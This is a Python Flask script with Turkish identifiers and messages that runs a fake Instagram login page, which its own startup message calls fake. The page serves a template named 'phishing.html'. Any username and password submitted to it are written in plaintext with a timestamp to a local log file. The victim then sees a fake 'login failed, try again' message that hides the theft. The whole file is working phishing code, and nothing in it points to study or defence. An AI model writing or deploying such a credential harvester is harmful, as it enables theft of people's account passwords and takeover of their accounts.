from flask import Flask, render_template, request
import datetime

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def fake_login():
    if request.method == "POST":
        kullanici_adi = request.form.get("username")
        sifre = request.form.get("password")

        with open("loglar.txt", "a") as f:
            f.write(f"[{datetime.datetime.now()}] - Kullanıcı: {kullanici_adi} | Şifre: {sifre}\n")

        return "<h2>⚠️ Giriş başarısız. Lütfen tekrar deneyin.</h2>"

    return render_template("phishing.html")

if __name__ == "__main__":
    print("🎯 Fake Instagram sayfası başlatıldı")
    app.run(host="0.0.0.0", port=8080)
